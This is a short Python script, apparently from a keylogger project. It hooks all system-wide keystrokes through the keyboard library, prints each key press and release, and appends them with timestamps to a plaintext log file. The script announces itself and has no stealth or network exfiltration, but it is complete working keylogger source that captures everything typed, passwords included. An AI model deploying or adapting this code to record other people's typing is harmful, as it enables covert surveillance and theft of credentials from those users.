import keyboard
import datetime

def live_monitor():
    """
    Live monitoring of keystrokes.
    """
    print("Live monitoring started. Press 'Ctrl + C' to stop.")
    
    # Open a log file in append mode
    log_filename = "keylogger/keystrokes_log.txt"
    with open(log_filename, "a") as log_file:
        log_file.write(f"\nKeystroke logging started at {datetime.datetime.now()}\n")
        
        try:
            # Start listening for key events
            keyboard.hook(lambda event: print_event(event, log_file))
            # Keep the program running until interrupted
            keyboard.wait()
        except KeyboardInterrupt:
            pass
        finally:
            # Unhook the keyboard listener
            keyboard.unhook_all()
            log_file.write(f"\nKeystroke logging stopped at {datetime.datetime.now()}\n")
            print("Live monitoring stopped.")

def print_event(event, log_file):
    """
    Print the details of the keyboard event and log it to a file.
    """
    event_details = f"Event: {event.name}, Key: {event.scan_code}, State: {'Pressed' if event.event_type == 'down' else 'Released'}"
    print(event_details)
    log_file.write(event_details + "\n")

if __name__ == "__main__":
    live_monitor()
